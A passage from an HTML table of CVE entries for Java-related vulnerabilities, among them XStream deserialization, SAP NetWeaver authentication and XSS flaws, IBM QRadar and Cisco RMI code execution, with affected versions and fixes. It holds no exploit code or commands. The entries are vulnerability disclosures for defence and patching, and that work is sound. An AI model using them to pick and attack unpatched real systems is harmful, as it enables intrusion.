		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability where the processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that result in the deletion of a file on the local host. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21342">CVE-2021-21342</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability where the processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that result in a server-side forgery request. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21341">CVE-2021-21341</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is vulnerability which may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream. No user is affected who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21331">CVE-2021-21331</a></td>
		<td valign="top">The Java client for the Datadog API before version 1.0.0-beta.9 has a local information disclosure of sensitive information downloaded via the API using the API Client. The Datadog API is executed on a unix-like system with multiple users. The API is used to download a file containing sensitive information. This sensitive information is exposed locally to other users. This vulnerability exists in the API Client for version 1 and 2. The method `prepareDownloadFilecreates` creates a temporary file with the permissions bits of `-rw-r--r--` on unix-like systems. On unix-like systems, the system temporary directory is shared between users. As such, the contents of the file downloaded via the `downloadFileFromResponse` method will be visible to all other users on the local system. Analysis of the finding determined that the affected code was unused, meaning that the exploitation likelihood is low. The unused code has been removed, effectively mitigating this issue. This issue has been patched in version 1.0.0-beta.9. As a workaround one may specify `java.io.tmpdir` when starting the JVM with the flag `-Djava.io.tmpdir`, specifying a path to a directory with `drw-------` permissions owned by `dd-agent`.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21307">CVE-2021-21307</a></td>
		<td valign="top">Lucee Server is a dynamic, Java based (JSR-223), tag and scripting language used for rapid web application development. In Lucee Admin before versions 5.3.7.47, 5.3.6.68 or 5.3.5.96 there is an unauthenticated remote code exploit. This is fixed in versions 5.3.7.47, 5.3.6.68 or 5.3.5.96. As a workaround, one can block access to the Lucee Administrator.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21292">CVE-2021-21292</a></td>
		<td valign="top">Traccar is an open source GPS tracking system. In Traccar before version 4.12 there is an unquoted Windows binary path vulnerability. Only Windows versions are impacted. Attacker needs write access to the filesystem on the host machine. If Java path includes a space, then attacker can lift their privilege to the same as Traccar service (system). This is fixed in version 4.12.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-20492">CVE-2021-20492</a></td>
		<td valign="top">IBM WebSphere Application Server 8.0, 8.5, 9.0, and Liberty Java Batch is vulnerable to an XML External Entity Injection (XXE) attack when processing XML data. A remote attacker could exploit this vulnerability to expose sensitive information or consume memory resources. IBM X-Force ID: 197793.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-20328">CVE-2021-20328</a></td>
		<td valign="top">Specific versions of the Java driver that support client-side field level encryption (CSFLE) fail to perform correct host name verification on the KMS server&amp;#8217;s certificate. This vulnerability in combination with a privileged network position active MITM attack could result in interception of traffic between the Java driver and the KMS service rendering Field Level Encryption ineffective. This issue was discovered during internal testing and affects all versions of the Java driver that support CSFLE. The Java async, Scala, and reactive streams drivers are not impacted. This vulnerability does not impact driver traffic payloads with CSFLE-supported key services originating from applications residing inside the AWS, GCP, and Azure network fabrics due to compensating controls in these environments. This issue does not impact driver workloads that don&amp;#8217;t use Field Level Encryption.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-20202">CVE-2021-20202</a></td>
		<td valign="top">A flaw was found in keycloak. Directories can be created prior to the Java process creating them in the temporary directory, but with wider user permissions, allowing the attacker to have access to the contents that keycloak stores in this directory. The highest threat from this vulnerability is to data confidentiality and integrity.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-20032">CVE-2021-20032</a></td>
		<td valign="top">SonicWall Analytics 2.5 On-Prem is vulnerable to Java Debug Wire Protocol (JDWP) interface security misconfiguration vulnerability which potentially leads to Remote Code Execution. This vulnerability impacts Analytics On-Prem 2.5.2518 and earlier.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-1993">CVE-2021-1993</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows low privileged attacker having Create Session privilege with network access via Oracle Net to compromise Java VM. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java VM accessible data. CVSS 3.1 Base Score 4.8 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-1478">CVE-2021-1478</a></td>
		<td valign="top">A vulnerability in the Java Management Extensions (JMX) component of Cisco Unified Communications Manager (Unified CM) and Cisco Unified Communications Manager Session Management Edition (Unified CM SME) could allow an authenticated, remote attacker to cause a denial of service (DoS) condition on an affected system. This vulnerability is due to an unsecured TCP/IP port. An attacker could exploit this vulnerability by accessing the port and restarting the JMX process. A successful exploit could allow the attacker to cause a DoS condition on an affected system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-9761">CVE-2020-9761</a></td>
		<td valign="top">An issue was discovered in UNCTAD ASYCUDA World 2001 through 2020. The Java RMI Server has an Insecure Default Configuration, leading to Java Code Execution from a remote URL because an RMI Distributed Garbage Collector method is called.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-9733">CVE-2020-9733</a></td>
		<td valign="top">An AEM java servlet in AEM versions 6.5.5.0 (and below) and 6.4.8.1 (and below) executes with the permissions of a high privileged service user. If exploited, this could lead to read-only access to sensitive data in an AEM repository.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-9493">CVE-2020-9493</a></td>
		<td valign="top">A deserialization flaw was found in Apache Chainsaw versions prior to 2.1.0 which could lead to malicious code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-9297">CVE-2020-9297</a></td>
		<td valign="top">Netflix Titus, all versions prior to version v0.1.1-rc.274, uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-9296">CVE-2020-9296</a></td>
		<td valign="top">Netflix Titus uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-9040">CVE-2020-9040</a></td>
		<td valign="top">Couchbase Server Java SDK before 2.7.1.1 allows a potential attacker to forge an SSL certificate and pose as the intended peer. An attacker can leverage this flaw by crafting a cryptographically valid certificate that will be accepted by Java SDK's Netty component due to missing hostname verification.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-9004">CVE-2020-9004</a></td>
		<td valign="top">A remote authenticated authorization-bypass vulnerability in Wowza Streaming Engine 4.8.0 and earlier allows any read-only user to issue requests to the administration panel in order to change functionality. For example, a read-only user may activate the Java JMX port in unauthenticated mode and execute OS commands under root privileges. This issue was resolved in Wowza Streaming Engine 4.8.5.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-8929">CVE-2020-8929</a></td>
		<td valign="top">A mis-handling of invalid unicode characters in the Java implementation of Tink versions prior to 1.5 allows an attacker to change the ID part of a ciphertext, which result in the creation of a second ciphertext that can decrypt to the same plaintext. This can be a problem with encrypting deterministic AEAD with a single key, and rely on a unique ciphertext-per-plaintext.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-8908">CVE-2020-8908</a></td>
		<td valign="top">A temp directory creation vulnerability exists in all versions of Guava, allowing an attacker with access to the machine to potentially access data in a temporary directory created by the Guava API com.google.common.io.Files.createTempDir(). By default, on unix-like systems, the created directory is world-readable (readable by an attacker with access to the system). The method in question has been marked @Deprecated in versions 30.0 and later and should not be used. For Android developers, we recommend choosing a temporary directory API provided by Android, such as context.getCacheDir(). For other Java developers, we recommend migrating to the Java 7 API java.nio.file.Files.createTempDirectory() which explicitly configures permissions of 700, or configuring the Java runtime's java.io.tmpdir system property to point to a location whose permissions are appropriately configured.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-8897">CVE-2020-8897</a></td>
		<td valign="top">A weak robustness vulnerability exists in the AWS Encryption SDKs for Java, Python, C and Javalcript prior to versions 2.0.0. Due to the non-committing property of AES-GCM (and other AEAD ciphers such as AES-GCM-SIV or (X)ChaCha20Poly1305) used by the SDKs to encrypt messages, an attacker can craft a unique cyphertext which will decrypt to multiple different results, and becomes especially relevant in a multi-recipient setting. We recommend users update their SDK to 2.0.0 or later.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-8574">CVE-2020-8574</a></td>
		<td valign="top">Active IQ Unified Manager for Linux versions prior to 9.6 ship with the Java Management Extension Remote Method Invocation (JMX RMI) service enabled allowing unauthorized code execution to local users.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-8570">CVE-2020-8570</a></td>
		<td valign="top">Kubernetes Java client libraries in version 10.0.0 and versions prior to 9.0.1 allow writes to paths outside of the current directory when copying multiple files from a remote pod which sends a maliciously crafted archive. This can potentially overwrite any files on the system of the process executing the client code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-7931">CVE-2020-7931</a></td>
		<td valign="top">In JFrog Artifactory 5.x and 6.x, insecure FreeMarker template processing leads to remote code execution, e.g., by modifying a .ssh/authorized_keys file. Patches are available for various versions between 5.11.8 and 6.16.0. The issue exists because use of the DefaultObjectWrapper class makes certain Java functions accessible to a template.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-7226">CVE-2020-7226</a></td>
		<td valign="top">CiphertextHeader.java in Cryptacular 1.2.3, as used in Apereo CAS and other products, allows attackers to trigger excessive memory allocation during a decode operation, because the nonce array length associated with "new byte" may depend on untrusted input within the header of encoded data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6958">CVE-2020-6958</a></td>
		<td valign="top">An XXE vulnerability in JnlpSupport in Yet Another Java Service Wrapper (YAJSW) 12.14, as used in NSA Ghidra and other products, allows attackers to exfiltrate data from remote hosts and potentially cause denial-of-service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6365">CVE-2020-6365</a></td>
		<td valign="top">SAP NetWeaver AS Java, versions - 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, Start Page allows an unauthenticated remote attacker to redirect users to a malicious site due to insufficient reverse tabnabbing URL validation. The attacker could execute phishing attacks to steal credentials of the victim or to redirect users to untrusted web pages containing malware or similar malicious exploits.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6326">CVE-2020-6326</a></td>
		<td valign="top">SAP NetWeaver (Knowledge Management), version-7.30,7.31,7.40,7.50, allows an authenticated attacker to create malicious links in the UI, when clicked by victim, will execute arbitrary java scripts thus extracting or modifying information otherwise restricted leading to Stored Cross Site Scripting.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6319">CVE-2020-6319</a></td>
		<td valign="top">SAP NetWeaver Application Server Java, versions - 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, and 7.50 allows an unauthenticated attacker to include JavaScript blocks in any web page or URL with different symbols which are otherwise not allowed. On successful exploitation an attacker can steal authentication information of the user, such as data relating to his or her current session and limitedly impact confidentiality and integrity of the application, leading to Reflected Cross Site Scripting.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6313">CVE-2020-6313</a></td>
		<td valign="top">SAP NetWeaver Application Server JAVA(XML Forms) versions 7.30, 7.31, 7.40, 7.50 does not sufficiently encode user controlled inputs, which allows an authenticated User with special roles to store malicious content, that when accessed by a victim, can perform malicious actions by executing JavaScript, leading to Stored Cross-Site Scripting.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6309">CVE-2020-6309</a></td>
		<td valign="top">SAP NetWeaver AS JAVA, versions - (ENGINEAPI 7.10; WSRM 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50; J2EE-FRMW 7.10, 7.11), does not perform any authentication checks for a web service allowing the attacker to send several payloads and leading to complete denial of service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6287">CVE-2020-6287</a></td>
		<td valign="top">SAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system, leading to Missing Authentication Check.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6286">CVE-2020-6286</a></td>
		<td valign="top">The insufficient input path validation of certain parameter in the web service of SAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, allows an unauthenticated attacker to exploit a method to download zip files to a specific directory, leading to Path Traversal.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6285">CVE-2020-6285</a></td>
		<td valign="top">SAP NetWeaver - XML Toolkit for JAVA (ENGINEAPI) (versions- 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50), under certain conditions allows an attacker to access information which would otherwise be restricted, leading to Information Disclosure.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6282">CVE-2020-6282</a></td>
		<td valign="top">SAP NetWeaver AS JAVA (IIOP service) (SERVERCORE), versions 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, and SAP NetWeaver AS JAVA (IIOP service) (CORE-TOOLS), versions 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, allows an attacker to send a crafted request from a vulnerable web application. It is usually used to target internal systems behind firewalls that are normally inaccessible to an attacker from the external network, resulting in a Server-Side Request Forgery vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6263">CVE-2020-6263</a></td>
		<td valign="top">Standalone clients connecting to SAP NetWeaver AS Java via P4 Protocol, versions (SAP-JEECOR 7.00, 7.01; SERVERCOR 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50; CORE-TOOLS 7.00, 7.01, 7.02, 7.05, 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50) do not perform any authentication checks for operations that require user identity leading to Authentication Bypass.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6224">CVE-2020-6224</a></td>
		<td valign="top">SAP NetWeaver AS Java (HTTP Service), versions 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, allows an attacker with administrator privileges to access user sensitive data such as passwords in trace files, when the user logs in and sends request with login credentials, leading to Information Disclosure.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6202">CVE-2020-6202</a></td>
		<td valign="top">SAP NetWeaver Application Server Java (User Management Engine), versions- 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50; does not sufficiently validate the LDAP data source configuration XML document accepted from an untrusted source, leading to Missing XML Validation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-6190">CVE-2020-6190</a></td>
		<td valign="top">Certain vulnerable endpoints in SAP NetWeaver AS Java (Heap Dump Application), versions 7.30, 7.31, 7.40, 7.50, provide valuable information about the system like hostname, server node and installation path that could be misused by an attacker leading to Information Disclosure.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-5604">CVE-2020-5604</a></td>
		<td valign="top">Android App 'Mercari' (Japan version) prior to version 3.52.0 allows arbitrary method execution of a Java object by a remote attacker via a Man-In-The-Middle attack by using Java Reflection API of JavaScript code on WebView.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-5529">CVE-2020-5529</a></td>
		<td valign="top">HtmlUnit prior to 2.37.0 contains code execution vulnerabilities. HtmlUnit initializes Rhino engine improperly, hence a malicious JavScript code can execute arbitrary Java code on the application. Moreover, when embedded in Android application, Android-specific initialization of Rhino engine is done in an improper way, hence a malicious JavaScript code can execute arbitrary Java code on the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-5413">CVE-2020-5413</a></td>
		<td valign="top">Spring Integration framework provides Kryo Codec implementations as an alternative for Java (de)serialization. When Kryo is configured with default options, all unregistered classes are resolved on demand. This leads to the "deserialization gadgets" exploit when provided data contains malicious code for execution during deserialization. In order to protect against this type of attack, Kryo can be configured to require a set of trusted classes for (de)serialization. Spring Integration should be proactive against blocking unknown "deserialization gadgets" when configuring Kryo in code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-5327">CVE-2020-5327</a></td>
		<td valign="top">Dell Security Management Server versions prior to 10.2.10 contain a Java RMI Deserialization of Untrusted Data vulnerability. When the server is exposed to the internet and Windows Firewall is disabled, a remote unauthenticated attacker may exploit this vulnerability by sending a crafted RMI request to execute arbitrary code on the target host.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-5245">CVE-2020-5245</a></td>
		<td valign="top">Dropwizard-Validation before 1.3.19, and 2.0.2 may allow arbitrary code execution on the host system, with the privileges of the Dropwizard service account, by injecting arbitrary Java Expression Language expressions when using the self-validating feature. The issue has been fixed in dropwizard-validation 1.3.19 and 2.0.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-4888">CVE-2020-4888</a></td>
		<td valign="top">IBM QRadar SIEM 7.4.0 to 7.4.2 Patch 1 and 7.3.0 to 7.3.3 Patch 7 could allow a remote attacker to execute arbitrary commands on the system, caused by insecure deserialization of user-supplied content by the Java deserialization function. By sending a malicious serialized Java object, an attacker could exploit this vulnerability to execute arbitrary commands on the system. IBM X-Force ID: 190912.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-4781">CVE-2020-4781</a></td>
		<td valign="top">An improper input validation before calling java readLine() method may impact IBM Curam Social Program Management 7.0.9 and 7.0.10, which could result in a denial of service. IBM X-Force ID: 189159.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-4521">CVE-2020-4521</a></td>
		<td valign="top">IBM Maximo Asset Management 7.6.0 and 7.6.1 could allow a remote authenticated attacker to execute arbitrary code on the system, caused by an unsafe deserialization in Java. By sending specially-crafted request, an attacker could exploit this vulnerability to execute arbitrary code on the system. IBM X-Force ID: 182396.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-4325">CVE-2020-4325</a></td>
		<td valign="top">The IBM Process Federation Server 18.0.0.1, 18.0.0.2, 19.0.0.1, 19.0.0.2, and 19.0.0.3 Global Teams REST API does not properly shutdown the thread pools that it creates to retrieve Global Teams information from the federated systems. As a consequence, the Java Virtual Machine can't recover the memory used by those thread pools, which leads to an OutOfMemory exception when the Process Federation Server Global Teams REST API is used extensively. IBM X-Force ID: 177596.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-4280">CVE-2020-4280</a></td>
		<td valign="top">IBM QRadar SIEM 7.3 and 7.4 could allow a remote attacker to execute arbitrary commands on the system, caused by insecure deserialization of user-supplied content by the Java deserialization function. By sending a malicious serialized Java object, an attacker could exploit this vulnerability to execute arbitrary commands on the system. IBM X-Force ID: 176140.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-36641">CVE-2020-36641</a></td>
		<td valign="top">A vulnerability classified as problematic was found in gturri aXMLRPC up to 1.12.0. This vulnerability affects the function ResponseParser of the file src/main/java/de/timroes/axmlrpc/ResponseParser.java. The manipulation leads to xml external entity reference. Upgrading to version 1.14.0 is able to address this issue. The patch is identified as 456752ebc1ef4c0db980cb5b01a0b3cd0a9e0bae. It is recommended to upgrade the affected component. VDB-217450 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-36640">CVE-2020-36640</a></td>
		<td valign="top">A vulnerability, which was classified as problematic, was found in bonitasoft bonita-connector-webservice up to 1.3.0. This affects the function TransformerConfigurationException of the file src/main/java/org/bonitasoft/connectors/ws/SecureWSConnector.java. The manipulation leads to xml external entity reference. Upgrading to version 1.3.1 is able to address this issue. The patch is named a12ad691c05af19e9061d7949b6b828ce48815d5. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217443.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-36636">CVE-2020-36636</a></td>
		<td valign="top">A vulnerability classified as problematic has been found in OpenMRS Admin UI Module up to 1.4.x. Affected is the function sendErrorMessage of the file omod/src/main/java/org/openmrs/module/adminui/page/controller/systemadmin/accounts/AccountPageController.java of the component Account Setup Handler. The manipulation leads to cross site scripting. It is possible to launch the attack remotely. Upgrading to version 1.5.0 is able to address this issue. The name of the patch is 702fbfdac7c4418f23bb5f6452482b4a88020061. It is recommended to upgrade the affected component. VDB-216918 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-36635">CVE-2020-36635</a></td>
		<td valign="top">A vulnerability was found in OpenMRS Appointment Scheduling Module up to 1.12.x. It has been classified as problematic. This affects the function validateFieldName of the file api/src/main/java/org/openmrs/module/appointmentscheduling/validator/AppointmentTypeValidator.java. The manipulation leads to cross site scripting. It is possible to initiate the attack remotely. Upgrading to version 1.13.0 is able to address this issue. The name of the patch is 34213c3f6ea22df427573076fb62744694f601d8. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-216915.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-36634">CVE-2020-36634</a></td>
		<td valign="top">A vulnerability classified as problematic has been found in Indeed Engineering util up to 1.0.33. Affected is the function visit/appendTo of the file varexport/src/main/java/com/indeed/util/varexport/servlet/ViewExportedVariablesServlet.java. The manipulation leads to cross site scripting. It is possible to launch the attack remotely. Upgrading to version 1.0.34 is able to address this issue. The name of the patch is c0952a9db51a880e9544d9fac2a2218a6bfc9c63. It is recommended to upgrade the affected component. VDB-216882 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-36628">CVE-2020-36628</a></td>
		<td valign="top">A vulnerability classified as critical has been found in Calsign APDE. This affects the function handleExtract of the file APDE/src/main/java/com/calsignlabs/apde/build/dag/CopyBuildTask.java of the component ZIP File Handler. The manipulation leads to path traversal. Upgrading to version 0.5.2-pre2-alpha is able to address this issue. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-216747.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-36518">CVE-2020-36518</a></td>
		<td valign="top">jackson-databind before 2.13.0 allows a Java StackOverflow exception and denial of service via a large depth of nested objects.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-3402">CVE-2020-3402</a></td>
		<td valign="top">A vulnerability in the Java Remote Method Invocation (RMI) interface of Cisco Unified Customer Voice Portal (CVP) could allow an unauthenticated, remote attacker to access sensitive information on an affected device. The vulnerability exists because certain RMI listeners are not properly authenticated. An attacker could exploit this vulnerability by sending a crafted request to the affected listener. A successful exploit could allow the attacker to access sensitive information on an affected device.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-3280">CVE-2020-3280</a></td>
		<td valign="top">A vulnerability in the Java Remote Management Interface of Cisco Unified Contact Center Express (Unified CCX) could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device. The vulnerability is due to insecure deserialization of user-supplied content by the affected software. An attacker could exploit this vulnerability by sending a malicious serialized Java object to a specific listener on an affected system. A successful exploit could allow the attacker to execute arbitrary code as the root user on an affected device.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2968">CVE-2020-2968</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java VM, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.1 Base Score 8.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-29582">CVE-2020-29582</a></td>
		<td valign="top">In JetBrains Kotlin before 1.4.21, a vulnerable Java API was used for temporary file and folder creation. An attacker was able to read data from such files and list directories due to insecure permissions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-29204">CVE-2020-29204</a></td>
		<td valign="top">XXL-JOB 2.2.0 allows Stored XSS (in Add User) to bypass the 20-character limit via xxl-job-admin/src/main/java/com/xxl/job/admin/controller/UserController.java.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-28923">CVE-2020-28923</a></td>
		<td valign="top">An issue was discovered in Play Framework 2.8.0 through 2.8.4. Carefully crafted JSON payloads sent as a form field lead to Data Amplification. This affects users migrating from a Play version prior to 2.8.0 that used the Play Java API to serialize classes with protected or private fields to JSON.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2830">CVE-2020-2830</a></td>
